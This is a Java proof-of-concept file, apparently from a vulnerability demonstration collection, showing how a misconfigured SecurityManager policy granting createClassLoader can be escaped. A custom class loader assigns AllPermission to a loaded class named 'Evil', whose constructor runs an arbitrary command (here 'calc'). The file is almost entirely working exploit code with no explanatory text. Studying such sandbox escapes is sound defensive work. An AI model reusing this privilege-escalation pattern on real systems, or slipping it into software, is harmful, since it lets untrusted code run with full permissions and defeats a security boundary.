package com.r17a.commonvuln.securitymissconfig.securitymanager;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.channels.WritableByteChannel;
import java.security.*;
import java.security.cert.Certificate;

public class BypassByClassloader {
    public static void main(String[] args) {
        //TODO compile and run with: -Djava.security.manager -Djava.security.policy==bypass-by-createclassloader.policy
        // grant{
        //    permission java.lang.RuntimePermission "createClassLoader";
        //    permission java.io.FilePermission "<<ALL FILES>>", "read";
        // };

        MyClassLoader mcl = new MyClassLoader();
        try {
            Class<?> c1 = Class.forName("com.r17a.commonvuln.securitymissconfig.securitymanager.Evil", true, mcl);
            Object obj = c1.newInstance();
            System.out.println(obj.getClass().getClassLoader());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

class Evil {
    public Evil(){
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

class MyClassLoader extends ClassLoader {
    public MyClassLoader() {
    }

    public MyClassLoader(ClassLoader parent) {
        super(parent);
    }

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        File file = getClassFile(name);
        try {
            byte[] bytes = getClassBytes(file);
            //call defineClazz not super.defineClass
            return defineClazz(name, bytes, 0, bytes.length);
        } catch (Exception e) {
            e.printStackTrace();
        }

        return super.findClass(name);
    }

    protected final Class<?> defineClazz(String name, byte[] b, int off, int len) throws ClassFormatError {
        try {
            PermissionCollection pc = new Permissions();
            pc.add(new AllPermission());

            //设置ProtectionDomain
            ProtectionDomain pd = new ProtectionDomain(new CodeSource(null, (Certificate[]) null),
                    pc, this, null);
            return this.defineClass(name, b, off, len, pd);
        } catch (Exception e) {
            return null;
        }
    }

    private File getClassFile(String name) {
        File file = new File("./" + name + ".class");
        return file;
    }

    private byte[] getClassBytes(File file) throws Exception {
        FileInputStream fis = new FileInputStream(file);
        FileChannel fc = fis.getChannel();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        WritableByteChannel wbc = Channels.newChannel(baos);
        ByteBuffer by = ByteBuffer.allocate(1024);

        while (true) {
            int i = fc.read(by);
            if (i == 0 || i == -1) {
                break;
            }

            by.flip();
            wbc.write(by);
            by.clear();
        }
        fis.close();
        return baos.toByteArray();
    }
}